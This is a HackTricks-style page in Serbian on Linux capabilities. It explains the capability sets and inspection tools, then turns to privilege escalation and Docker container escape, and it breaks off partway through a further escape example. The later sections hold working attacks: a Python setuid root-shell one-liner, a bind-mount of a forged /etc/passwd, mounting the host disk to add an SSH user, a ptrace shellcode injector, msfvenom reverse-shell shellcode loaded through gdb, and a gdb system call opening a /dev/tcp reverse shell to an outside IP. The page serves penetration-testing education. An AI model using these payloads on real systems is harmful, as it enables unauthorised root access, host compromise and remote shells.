# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities dele **root privilegije na manje, zasebne jedinice**, što procesima omogućava da imaju samo podskup privilegija. Time se smanjuju rizici jer se pune root privilegije ne dodeljuju bez potrebe.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Problem:

- Obični korisnici imaju ograničene dozvole za operacije kao što su otvaranje raw sockets ili vezivanje Internet portova ispod 1024; capabilities mogu da dodele samo potrebnu dozvolu, umesto punih root privilegija.<sup>[[14]](#references)</sup>

### Skupovi capabilities:

Linux izlaže ove skupove capabilities po niti, a kernel primenjuje njihova ograničenja kada proces menja akreditive ili izvršava datoteku.<sup>[[14]](#references)</sup>

1. **Nasleđeni (CapInh)**:

   - **Svrha**: Određuje capabilities koje mogu da doprinesu skupu dozvoljenih capabilities nakon `execve()`, kada izvršena datoteka ima odgovarajuće inheritable file capabilities.
   - **Funkcionalnost**: Nasleđeni skup niti čuva se kroz `execve()`; on sam po sebi ne čini te capabilities efektivnim.
   - **Ograničenja**: Dodavanje capability-ja u ovaj skup ograničeno je skupovima dozvoljenih i ograničavajućih capabilities.<sup>[[14]](#references)</sup>

2. **Efektivni (CapEff)**:

   - **Svrha**: Predstavlja capabilities koje proces trenutno koristi.
   - **Funkcionalnost**: Ovo je skup capabilities koje kernel proverava da bi odobrio dozvole za različite operacije. Kod datoteka, ovaj skup može biti zastavica koja označava da li se dozvoljene capabilities datoteke smatraju efektivnim.
   - **Značaj**: Efektivni skup je ključan za neposredne provere privilegija i predstavlja aktivni skup capabilities koje proces može da koristi.

3. **Dozvoljeni (CapPrm)**:

   - **Svrha**: Definiše najveći skup capabilities koje proces može da poseduje.
   - **Funkcionalnost**: Proces može da unapredi capability iz dozvoljenog skupa u efektivni skup, čime dobija mogućnost da je koristi. Može i da ukloni capabilities iz dozvoljenog skupa.
   - **Granica**: Ako se capability ukloni iz ovog skupa, obično se ne može vratiti bez izvršavanja datoteke koja je dodeljuje ili druge privilegovane tranzicije.<sup>[[14]](#references)</sup>

4. **Ograničavajući (CapBnd)**:

   - **Svrha**: Ograničava capabilities koje proces može da dobije iz datoteke tokom `execve()` i one koje može da doda u svoj nasleđeni skup.
   - **Funkcionalnost**: Skup se nasleđuje kroz `fork()` i čuva kroz `execve()`; capabilities se mogu ukloniti iz njega kada pozivalac ima `CAP_SETPCAP`.
   - **Slučaj upotrebe**: Uklanjanje nepotrebnih capabilities iz ovog skupa ograničava kasnije sticanje privilegija.<sup>[[14]](#references)</sup>

5. **Ambijentalni (CapAmb)**:
   - **Svrha**: Omogućava da izabrane capabilities ostanu dozvoljene i efektivne kroz `execve()` neprivilegovanog programa.
   - **Funkcionalnost**: Ambijentalne capabilities dodaju se u nove dozvoljene i efektivne skupove kada izvršena datoteka nije privilegovana.
   - **Ograničenja**: Capability može biti ambijentalna samo dok je prisutna i u dozvoljenom i u nasleđenom skupu; izvršavanje set-user-ID/set-group-ID datoteke ili datoteke sa capabilities briše ambijentalni skup.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities procesa i binarnih datoteka

### Capabilities procesa

Da biste videli capabilities određenog procesa, koristite datoteku **status** u direktorijumu /proc. Pošto pruža više detalja, ograničimo prikaz samo na informacije povezane sa Linux capabilities.\
Imajte u vidu da se za sve pokrenute procese informacije o capabilities čuvaju po niti, dok se capabilities datoteka čuvaju u proširenim atributima `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Definisane capabilities možete pronaći u /usr/include/linux/capability.h

Capabilities trenutnog procesa možete pronaći pomoću `cat /proc/self/status` ili komande `capsh --print`, a capabilities drugih procesa u `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Ova komanda bi trebalo da prikaže pet linija capability-ja na većini sistema.<sup>[[15]](#references)</sup>

- CapInh = Nasleđene capability-je
- CapPrm = Dozvoljene capability-je
- CapEff = Efektivne capability-je
- CapBnd = Ograničavajući skup
- CapAmb = Skup ambijentalnih capability-ja

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Ovi heksadecimalni brojevi nemaju smisla. Pomoću uslužnog programa `capsh` možemo da ih dekodiramo u nazive Linux capabilities.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Hajde sada da proverimo **capabilities** koje koristi `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Iako to funkcioniše, postoji još jedan i jednostavniji način. Da biste videli capabilities pokrenutog procesa, upotrebite alatku **getpcaps** iza koje navedete ID procesa (PID); alatka prihvata i listu ID-jeva procesa.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Hajde da proverimo capabilities programa `tcpdump` nakon što smo binarnoj datoteci dodelili `cap_net_admin` i `cap_net_raw` da bi mogla da snifuje mrežu (`tcpdump` se izvršava u procesu 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Kao što možete da vidite, capabilities odgovaraju rezultatima dobijenim pomoću dva načina za pregled procesa. Alat `getpcaps` koristi libcap za proveru capabilities ciljnog procesa i prikazuje ih u tekstualnom obliku; prihvata jedan ili više PID-ova.<sup>[[22]](#references)</sup>

### Capabilities binarnih datoteka

Binarne datoteke mogu da imaju file capabilities koje se primenjuju tokom izvršavanja. Na primer, binarna datoteka `ping` može da ima capability `cap_net_raw`.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Možete **pretražiti binarne datoteke sa capabilities** pomoću `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Uklanjanje capabilities pomoću capsh

Ako uklonimo CAP_NET_RAW iz trenutno važećeg bounding skupa, program kome je ta capability potrebna više ne bi trebalo da može da je koristi.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Pored izlaza samog _capsh_, i sama komanda _tcpdump_ treba da prikaže grešku.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Greška pokazuje da `tcpdump` ne može da se izvrši sa traženom mogućnošću datoteke nakon što je `CAP_NET_RAW` uklonjen iz bounding seta.

### Uklanjanje mogućnosti

Mogućnosti datoteke možete ukloniti pomoću `setcap -r`.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Mogućnosti korisnika

Linux ne dodeljuje file capabilities direktno korisniku koji se prijavljuje, ali PAM modul `pam_cap` može da postavi nasleđene capabilities za autentifikovane sesije koristeći `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Svaki unos povezuje nazive ili brojeve capabilities, razdvojene zarezima, sa jednim ili više korisničkih imena.<sup>[[17]](#references)</sup>
Primer datoteke:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Capabilities okruženja

Kompajliranjem sledećeg programa moguće je **pokrenuti bash shell unutar okruženja koje pruža capabilities**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Unutar **bash-a koji izvršava kompajlirani ambient binary**, moguće je uočiti **nove capabilities** (običan korisnik neće imati nijedan capability u odeljku „current“).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Možete da dodate **samo capability-je koji postoje** i u dozvoljenom i u nasledivom skupu.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binaries

Capability-dumb binarni program je program sa file capability-jima koji ne koristi libcap za njihovo upravljanje. Ako je postavljen njegov file effective bit, kernel omogućava dozvoljene file capability-je u efektivnom skupu procesa; izvršavanje može da ne uspe ako proces nije dobio sve dozvoljene capability-je.<sup>[[14]](#references)</sup>

## Mogućnosti servisa

Sistemski servis koji se izvršava kao root može da zadrži široke capability-je, osim ako ih njegovo izvršno okruženje ne ograničava. U systemd jedinici, `User=` bira korisnika servisa, a `AmbientCapabilities=` dodaje imenovane capability-je u ambient skup procesa koji se izvršava.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capabilities u Docker kontejnerima

Docker pokreće kontejnere sa podrazumevanim skupom capabilities, koji se može promeniti pomoću `--cap-add` i `--cap-drop`; primer kontejnera može se pregledati pomoću `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities su korisne kada **želite da ograničite sopstvene procese nakon obavljanja privilegovanih operacija** (npr. nakon podešavanja chroot-a i povezivanja sa socket-om). Međutim, mogu se zloupotrebiti prosleđivanjem zlonamernih komandi ili argumenata, koji se zatim izvršavaju kao root.<sup>[[2]](#references)</sup>

Možete da nametnete file capabilities programima pomoću komande `setcap` i da ih proverite pomoću komande `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

U tekstu file-capability, `+ep` dodaje imenovanu capability u efektivni i dozvoljeni skup; `-` uklanja izabrane zastavice.<sup>[[21]](#references)</sup>

Da biste pronašli programe sa capabilities u sistemu ili fascikli, koristite `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Primer eksploatacije

U sledećem primeru, binarni fajl `/usr/bin/python2.6` je ranjiv na privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** potrebne za `tcpdump` kako bi se **svakom korisniku omogućilo hvatanje paketa**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Poseban slučaj izostavljenog naziva capability-ja

U libcap tekstualnom formatu, kada `getcap myelf` prikaže `myelf =ep`, to znači da su **sve capabilities** označene kao effective i permitted, uz ograničenja koja nameću bounding set izvršavajućeg procesa, user namespace i druga ograničenja pri izvršavanju. Prazan skup file capabilities je `myelf =` (bez `e` ili `p`); to nije isto što i datoteka bez atributa capability. Datoteka sa `=ep` sama po sebi ne menja UID procesa u root, ali program koji može da koristi `CAP_DAC_READ_SEARCH` ili `CAP_DAC_OVERRIDE` može da čita datoteke koje inače ne bi mogao da čita na osnovu svog Unix UID-a. Pre nego što ulazne opcije programa smatrate putanjom za čitanje privilegovanih datoteka, proverite stvarni režim izvršne datoteke, namespace i efektivne capabilities. Pogledajte libcap [tekstualni format capability-ja](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) i [ponašanje prazne vrednosti](https://man7.org/linux/man-pages/man8/getcap.8.html).<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** je izuzetno moćna Linux capability, često izjednačena sa nivoom bliskim root-u zbog širokih **administrativnih privilegija**, kao što su montiranje uređaja ili manipulisanje funkcijama kernela. Iako je neophodna za kontejnere koji simuliraju čitave sisteme, **`CAP_SYS_ADMIN` predstavlja značajne bezbednosne izazove**, naročito u kontejnerskim okruženjima, zbog mogućnosti eskalacije privilegija i kompromitovanja sistema. Zato njenu upotrebu treba strogo bezbednosno proceniti i pažljivo kontrolisati, uz snažnu preporuku da se ova capability ukloni iz kontejnera namenjenih konkretnim aplikacijama, kako bi se poštovao **princip najmanjih privilegija** i smanjila površina napada.<sup>[[14]](#references)</sup>

Kod promena namespace-a, važan je opseg: `setns()` proverava `CAP_SYS_ADMIN` u odnosu na user namespace koji poseduje ciljni namespace. Za ulazak u mount namespace potrebna je i `CAP_SYS_CHROOT` u user namespace-u pozivaoca. Capability koja se poseduje samo unutar privatnog, mapiranog user namespace-a zato ne omogućava proizvoljan ulazak u početne host namespace-ove.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Koristeći python, možete montirati izmenjenu _passwd_ datoteku preko stvarne _passwd_ datoteke:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

I na kraju izvršite **mount** izmenjene datoteke `passwd` na `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

I moći ćete da koristite **`su` kao root** koristeći lozinku „password“.

**Primer sa okruženjem (Docker breakout)**

Možete da proverite omogućene capabilities unutar Docker kontejnera pomoću:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

U prethodnom izlazu možete videti da je capability SYS_ADMIN omogućen.<sup>[[14]](#references)</sup>

- **Mount**

Uz odgovarajući pristup uređajima i namespace-ovima, to može omogućiti Docker kontejneru da **mount-uje disk domaćina i pristupi njegovom sadržaju**. Čvor uređaja mora predstavljati stvarni uređaj domaćina, cgroup za uređaje mora to dozvoljavati, a za mount-ovanje blokovskog fajl-sistema potreban je `CAP_SYS_ADMIN` u početnom user namespace-u.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Potpun pristup**

U prethodnoj metodi uspeli smo da pristupimo disku hosta.\
Ako host pokreće **ssh** server, možete **kreirati korisnika na montiranom disku** i pristupiti mu putem SSH-a.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Direktno čitanje i upisivanje u okviru `/mnt/host` već predstavljaju pristup host sistemu datoteka. Završni `chroot` služi samo kao pogodnost za rad sa putanjama i dodatno zahteva `CAP_SYS_CHROOT`; nije korak kojim se ostvaruje escape.

## CAP_SYS_PTRACE

Uz `CAP_SYS_PTRACE`, proces može da prati i pregleda druge procese koji su vidljivi u njegovom PID namespace-u. Da biste iz Docker kontejnera ciljali host procese, delite host PID namespace pomoću opcije `--pid=host` (ili se pridružite namespace-u koji sadrži ciljni proces).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava korišćenje funkcionalnosti za otklanjanje grešaka i praćenje sistemskih poziva koje pružaju `ptrace(2)` i pozivi za pristup memoriji drugog procesa, kao što su `process_vm_readv(2)` i `process_vm_writev(2)`. Iako je moćan alat za dijagnostiku i nadzor, ako je `CAP_SYS_PTRACE` omogućen bez restriktivnih mera, poput seccomp filtera za `ptrace(2)`, može značajno da ugrozi bezbednost sistema. Konkretno, može se iskoristiti za zaobilaženje drugih bezbednosnih ograničenja, naročito onih koje nameće seccomp, kao što pokazuju [dokazi koncepta (PoC), poput ovog](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Primer sa binarnom datotekom (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Primer sa binarnom datotekom (gdb)**

`gdb` sa mogućnošću `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Capability na debugger-u je samo trag za proveru. Proverite da li trenutni proces može da izvrši tu konkretnu datoteku (uključujući dozvole grupe i ACL), da li je `CAP_SYS_PTRACE` efektivan nakon izvršavanja i da li je cilj sa višim privilegijama vidljiv i dostupan za attach u istom PID namespace-u. `no_new_privs`, `nosuid` mount, capability bounding set, Yama, seccomp ili LSM mogu da promene rezultat. Pogledajte [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) i [Yama dokumentaciju kernela](https://docs.kernel.org/admin-guide/LSM/Yama.html). Izlistajte metapodatke datoteke i procesa bez attach-ovanja na cilj.

Napravite shellcode pomoću msfvenom-a za ubacivanje u memoriju preko gdb-a

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Debug-ujte root proces pomoću gdb-a i copy-paste-ujte prethodno generisane gdb linije:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Primer sa okruženjem (Docker breakout) - Još jedna zloupotreba gdb-a**

Ako je **GDB** instaliran (ili možete da ga instalirate, na primer pomoću `apk add gdb` ili `apt install gdb`), možete da **debugujete vidljiv host proces** i naterate ga da pozove funkciju `system`. Za to su potrebni efektivni `CAP_SYS_PTRACE` u korisničkom namespace-u cilja i vidljivost host PID-ova; `CAP_SYS_ADMIN` nije potreban. Yama, stanje koje ne dozvoljava dumpovanje, seccomp i LSM pravila i dalje mogu da blokiraju povezivanje.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Nećete moći da vidite izlaz komande koja se izvršava, ali će je taj proces izvršiti (pa nabavite rev shell).

> [!WARNING]
> Ako dobijete grešku „No symbol "system" in current context.”, pogledajte prethodni primer učitavanja shellcode-a u program preko gdb.

**Primer sa okruženjem (izlazak iz Docker kontejnera) - Shellcode Injection**

Možete proveriti koje su capabilities omogućene unutar Docker kontejnera pomoću:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

List **procese** koji se izvršavaju na **hostu** `ps -eaf`

